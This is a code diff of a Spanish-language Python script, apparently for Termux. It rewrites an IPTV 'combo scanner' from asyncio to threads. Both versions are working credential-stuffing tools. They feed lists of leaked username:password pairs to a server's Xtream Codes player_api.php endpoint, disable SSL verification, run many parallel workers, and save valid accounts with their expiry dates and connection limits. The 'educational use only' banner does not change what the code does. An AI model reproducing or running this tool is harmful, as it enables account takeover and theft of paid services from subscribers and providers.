@@ -1,182 +1,209 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+Escáner de IPTV para Termux - Estilo Juan
+Uso educativo únicamente en redes propias o con autorización.
+"""
 
-import asyncio
-import aiohttp
-from colorama import init, Fore, Style
-import sys
-import os
+import requests
+import json
 import time
+import threading
+import queue
+import os
+import sys
 from datetime import datetime
 
-# Inicializar colorama para coleres en la terminal
-init(autoreset=True)
+# Deshabilitar advertencias de SSL (para evitar ruido)
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Banner de inicio
-def show_banner():
-    print(Fore.CYAN + Style.BRIGHT + """
-    ╔═══════════════════════════════════════════╗
-    ║     IPTV COMBO SCANNER for Termux         ║
-    ║           Educational Use Only            ║
-    ╚═══════════════════════════════════════════╝
-    """ + Style.RESET_ALL)
-    print(Fore.YELLOW + "[!] Uso exclusivo para fines educativos. No me hago responsable del mal uso." + Style.RESET_ALL)
+# Banner con nombre "Juan"
+BANNER = """
+╔══════════════════════════════════════════╗
+║      🐉  JUAN IPTV SCANNER  🐉          ║
+║        Solo para fines educativos         ║
+╚══════════════════════════════════════════╝
+"""
 
-# Función para cargar combos desde un archivo
-def load_combos(filepath="combos.txt"):
+def limpiar_pantalla():
+    """Limpia la pantalla según el sistema operativo."""
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def mostrar_banner():
+    """Muestra el banner principal."""
+    print(BANNER)
+    print("  [!] Uso responsable. No atacar servidores ajenos.\n")
+
+def cargar_combos(ruta_archivo):
+    """Carga combos desde archivo (formato usuario:contraseña)."""
     combos = []
     try:
-        with open(filepath, 'r') as f:
-            for line in f:
-                # Buscar el separador ':' en la línea
-                if ':' in line:
-                    user, pwd = line.strip().split(':', 1)
+        with open(ruta_archivo, 'r', encoding='utf-8', errors='ignore') as f:
+            for linea in f:
+                linea = linea.strip()
+                if ':' in linea:
+                    user, pwd = linea.split(':', 1)
                     combos.append((user, pwd))
     except FileNotFoundError:
-        print(Fore.RED + f"[!] Error: No se encontró el archivo '{filepath}'." + Style.RESET_ALL)
+        print(f" [!] Error: No se encuentra el archivo '{ruta_archivo}'")
         sys.exit(1)
     return combos
 
-# Función para guardar un hit válido
-def save_hit(server_url, combo, user_info, filename="hits.txt"):
-    with open(filename, 'a') as f:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        f.write(f"[{timestamp}] SERVER: {server_url} | COMBO: {combo[0]}:{combo[1]}\n")
-        if user_info:
-            f.write(f"    INFO: {user_info}\n")
+def probar_combo(server, user, pwd, timeout=10):
+    """
+    Prueba un combo contra el servidor Xtream Codes.
+    Retorna (bool, dict_info) donde bool indica si es hit.
+    """
+    url = f"{server}/player_api.php?username={user}&password={pwd}"
+    try:
+        resp = requests.get(url, timeout=timeout, verify=False)
+        if resp.status_code == 200:
+            data = resp.json()
+            # Si es un diccionario con user_info, es válido
+            if isinstance(data, dict) and data.get('user_info'):
+                return True, data
+    except:
+        pass
+    return False, None
+
+def guardar_hit(server, user, pwd, info, archivo_salida):
+    """Guarda un hit encontrado en el archivo de resultados."""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    exp_date = info.get('user_info', {}).get('exp_date', 'N/A')
+    if exp_date and exp_date != 'N/A':
+        try:
+            exp_date = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
+        except:
+            pass
+    active_cons = info.get('user_info', {}).get('active_cons', 'N/A')
+    max_cons = info.get('user_info', {}).get('max_connections', 'N/A')
+    
+    with open(archivo_salida, 'a', encoding='utf-8') as f:
+        f.write(f"[{timestamp}] {user}:{pwd}\n")
+        f.write(f"  Servidor: {server}\n")
+        f.write(f"  Expira: {exp_date} | Activas: {active_cons} | Max: {max_cons}\n")
         f.write("-" * 50 + "\n")
 
-# Función asíncrona para probar un combo en un servidor Xtream Codes
-async def test_combo(session, server_url, combo, semaphore, results):
-    async with semaphore:
-        user, pwd = combo
-        # Construir la URL de la API de Xtream Codes
-        test_url = f"{server_url}/player_api.php?username={user}&password={pwd}"
-        
+def trabajador(server, combo_queue, resultados, hits, lock, archivo_salida, estado):
+    """
+    Función ejecutada por cada hilo.
+    Toma combos de la cola y los prueba.
+    """
+    while True:
         try:
-            # Intentar obtener la respuesta de la API
-            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
-                if response.status == 200:
-                    data = await response.json(content_type=None)
-                    # Verificar si la respuesta es un diccionario válido (no una lista vacía)
-                    if isinstance(data, dict) and data.get('user_info'):
-                        user_info = data.get('user_info')
-                        # Extraer información relevante del usuario
-                        info_text = f"Expira: {user_info.get('exp_date', 'N/A')}, "
-                        info_text += f"Activas: {user_info.get('active_cons', 'N/A')}"
-                        results.append(('hit', server_url, combo, info_text))
-                        return
-        except asyncio.TimeoutError:
-            pass  # Timeout, se ignora
-        except Exception:
-            pass  # Otros errores, se ignoran
+            idx, user, pwd = combo_queue.get(timeout=1)
+        except queue.Empty:
+            break
         
-        # Si no hubo éxito, se marca como 'bad'
-        results.append(('bad', server_url, combo, None))
+        # Actualizar estado del combo actual
+        with lock:
+            estado['actual'] = f"{user}:{pwd}"
+        
+        # Probar
+        es_hit, info = probar_combo(server, user, pwd)
+        
+        if es_hit:
+            with lock:
+                hits[0] += 1
+                resultados.append((user, pwd, info))
+                guardar_hit(server, user, pwd, info, archivo_salida)
+                # Mostrar hit inmediatamente en pantalla (línea aparte)
+                print(f"\n[+] HIT #{hits[0]}: {user}:{pwd}  [Expira: {info.get('user_info',{}).get('exp_date','N/A')}]")
+        
+        combo_queue.task_done()
+        
+        # Pequeña pausa para no saturar
+        time.sleep(0.05)
 
-# Función principal para escanear
-async def scan_servers(servers, combos, max_concurrent=20):
-    results = []
-    semaphore = asyncio.Semaphore(max_concurrent)
-    
-    # Usar una sesión de aiohttp para todas las conexiones
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        total_tasks = len(servers) * len(combos)
-        completed = 0
-        
-        for server in servers:
-            for combo in combos:
-                task = test_combo(session, server, combo, semaphore, results)
-                tasks.append(task)
-        
-        # Ejecutar todas las tareas de forma concurrente
-        print(Fore.GREEN + f"[*] Iniciando escaneo de {len(servers)} servidor(es) con {len(combos)} combo(s)... (Total: {total_tasks} pruebas)" + Style.RESET_ALL)
-        
-        # Usar as_completed para mostrar el progreso
-        for coro in asyncio.as_completed(tasks):
-            await coro
-            completed += 1
-            # Mostrar progreso cada 50 pruebas completadas
-            if completed % 50 == 0 or completed == total_tasks:
-                print(Fore.CYAN + f"[*] Progreso: {completed}/{total_tasks} pruebas completadas." + Style.RESET_ALL)
-    
-    return results
+def mostrar_estado(estado, hits, total, iniciado):
+    """Muestra la línea de estado actual (se actualiza dinámicamente)."""
+    procesados = estado['procesados']
+    porcentaje = (procesados / total) * 100 if total > 0 else 0
+    tiempo_trans = time.time() - iniciado
+    cps = procesados / tiempo_trans if tiempo_trans > 0 else 0
+    linea = (f"\r[*] Progreso: {procesados}/{total} combos ({porcentaje:.1f}%) | "
+             f"Hits: {hits[0]} | Combo actual: {estado['actual']:<30} | "
+             f"{cps:.1f} combos/seg   ")
+    sys.stdout.write(linea)
+    sys.stdout.flush()
 
-# Función para obtener la lista de servidores desde un archivo
-def load_servers(filepath="servers.txt"):
-    servers = []
-    try:
-        with open(filepath, 'r') as f:
-            for line in f:
-                server = line.strip()
-                if server:  # Ignorar líneas vacías
-                    servers.append(server)
-    except FileNotFoundError:
-        print(Fore.RED + f"[!] Error: No se encontró el archivo '{filepath}'." + Style.RESET_ALL)
-        sys.exit(1)
-    return servers
-
-# Función para mostrar el resumen final
-def show_results(results, start_time):
-    hits = [r for r in results if r[0] == 'hit']
-    bads = [r for r in results if r[0] == 'bad']
-    elapsed_time = time.time() - start_time
+def escanear(server, combos, num_hilos=10):
+    """
+    Función principal de escaneo.
+    """
+    total = len(combos)
+    combo_queue = queue.Queue()
+    for i, (user, pwd) in enumerate(combos):
+        combo_queue.put((i+1, user, pwd))
     
-    print("\n" + "="*60)
-    print(Fore.GREEN + Style.BRIGHT + "RESUMEN DEL ESCANEO")
+    resultados = []
+    hits = [0]
+    lock = threading.Lock()
+    estado = {'actual': 'Iniciando...', 'procesados': 0}
+    archivo_salida = f"hits_{server.replace('http://','').replace('https://','').replace(':','_')}.txt"
+    
+    # Hilos
+    hilos = []
+    for _ in range(num_hilos):
+        t = threading.Thread(target=trabajador, args=(server, combo_queue, resultados, hits, lock, archivo_salida, estado))
+        t.daemon = True
+        t.start()
+        hilos.append(t)
+    
+    # Monitor de progreso
+    inicio = time.time()
+    while any(t.is_alive() for t in hilos):
+        with lock:
+            procesados = total - combo_queue.qsize()
+            estado['procesados'] = procesados
+        mostrar_estado(estado, hits, total, inicio)
+        time.sleep(0.5)
+    
+    # Mostrar final
+    mostrar_estado(estado, hits, total, inicio)
+    print("\n\n" + "="*60)
+    print(f" ✓ Escaneo completado. Hits encontrados: {hits[0]}")
+    if hits[0] > 0:
+        print(f" ✓ Resultados guardados en: {archivo_salida}")
     print("="*60)
-    print(Fore.YELLOW + f"Tiempo total: {elapsed_time:.2f} segundos")
-    print(Fore.GREEN + f"Hits (Válidos): {len(hits)}")
-    print(Fore.RED + f"Bads (Inválidos): {len(bads)}")
-    
-    if hits:
-        print("\n" + Fore.GREEN + Style.BRIGHT + "=== HITS ENCONTRADOS ===" + Style.RESET_ALL)
-        for hit in hits:
-            _, server, combo, info = hit
-            print(Fore.GREEN + f"[+] Servidor: {server}")
-            print(f"    Combo: {combo[0]}:{combo[1]}")
-            if info:
-                print(f"    Info: {info}")
-            print("-" * 40)
-            # Guardar automáticamente el hit en el archivo hits.txt
-            save_hit(server, combo, info)
-        print(Fore.GREEN + f"\n[✓] Los hits se han guardado en 'hits.txt'" + Style.RESET_ALL)
-    else:
-        print(Fore.RED + "\n[✗] No se encontraron hits." + Style.RESET_ALL)
 
-# Bloque principal de ejecución
-if __name__ == "__main__":
-    show_banner()
+def main():
+    limpiar_pantalla()
+    mostrar_banner()
     
-    # Verificar argumentos de línea de comandos
-    if len(sys.argv) > 1 and sys.argv[1] == "--help":
-        print(Fore.CYAN + "Uso: python iptv_scanner.py [servidores.txt] [combos.txt]")
-        print("  servidores.txt: Archivo con lista de servidores IPTV (uno por línea)")
-        print("  combos.txt: Archivo con combos en formato usuario:contraseña (uno por línea)")
-        print("\nEjemplo: python iptv_scanner.py servidores.txt combos.txt")
-        sys.exit(0)
+    # Entrada de datos
+    servidor = input(" 🌐 Ingresa la URL del servidor IPTV (ej: http://ejemplo.com:8080): ").strip()
+    if not servidor.startswith("http"):
+        servidor = "http://" + servidor
+    # Eliminar barra final si existe
+    servidor = servidor.rstrip('/')
     
-    # Definir nombres de archivo por defecto o usar argumentos
-    server_file = sys.argv[1] if len(sys.argv) > 1 else "servers.txt"
-    combo_file = sys.argv[2] if len(sys.argv) > 2 else "combos.txt"
-    
-    # Cargar servidores y combos
-    print(Fore.CYAN + f"[*] Cargando servidores desde '{server_file}'..." + Style.RESET_ALL)
-    servers = load_servers(server_file)
-    print(Fore.GREEN + f"[✓] {len(servers)} servidor(es) cargados." + Style.RESET_ALL)
-    
-    print(Fore.CYAN + f"[*] Cargando combos desde '{combo_file}'..." + Style.RESET_ALL)
-    combos = load_combos(combo_file)
-    print(Fore.GREEN + f"[✓] {len(combos)} combo(s) cargados." + Style.RESET_ALL)
-    
-    if not servers or not combos:
-        print(Fore.RED + "[!] Error: No hay servidores o combos para escanear." + Style.RESET_ALL)
+    ruta_combo = input(" 📂 Ruta del archivo de combos (ej: /sdcard/combo/mis_combos.txt): ").strip()
+    if not os.path.exists(ruta_combo):
+        print(f" [!] El archivo '{ruta_combo}' no existe. Saliendo.")
         sys.exit(1)
     
-    # Iniciar el escaneo y medir el tiempo
-    start_time = time.time()
-    results = asyncio.run(scan_servers(servers, combos))
+    try:
+        num_hilos = int(input(" ⚙️  Número de hilos (recomendado 10-20): ") or "10")
+    except:
+        num_hilos = 10
     
-    # Mostrar los resultados
-    show_results(results, start_time)
+    print("\n[*] Cargando combos...")
+    combos = cargar_combos(ruta_combo)
+    if not combos:
+        print(" [!] No se encontraron combos válidos en el archivo.")
+        sys.exit(1)
+    
+    print(f"[*] Total de combos a probar: {len(combos)}")
+    print(f"[*] Usando {num_hilos} hilos. Presiona Ctrl+C para detener.\n")
+    time.sleep(2)
+    
+    try:
+        escanear(servidor, combos, num_hilos)
+    except KeyboardInterrupt:
+        print("\n\n [!] Escaneo interrumpido por el usuario.")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
